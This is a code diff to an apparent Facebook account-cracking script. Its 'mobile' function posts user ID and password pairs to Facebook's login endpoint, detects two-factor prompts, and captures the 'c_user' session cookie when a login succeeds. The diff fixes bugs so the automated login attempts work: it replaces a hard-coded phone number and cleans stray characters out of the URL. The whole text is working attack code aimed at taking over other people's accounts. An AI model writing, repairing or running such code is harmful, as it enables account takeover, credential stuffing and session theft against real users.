@@ -1518,7 +1518,7 @@ def mobile(uid,pwx,tl):
             'lgnrnd': ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
             'lgnjs': str(int(time.time())),
             'email': uid,
-            'prefill_contact_point': '7898667876',
+            'prefill_contact_point': uid,
             'prefill_source': 'browser_dropdown',
             'prefill_type': 'password',
             'first_prefill_source': 'browser_dropdown',
@@ -1551,8 +1551,8 @@ def mobile(uid,pwx,tl):
             'Sec-Fetch-User': '?1',
             'Priority': 'u=0, i',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1^&lwv=120^&lwc=1348131'
-            po = Session.post(url, cookies=cookies, headers=headers, data=data, allow_redirects=False).text
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348131'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
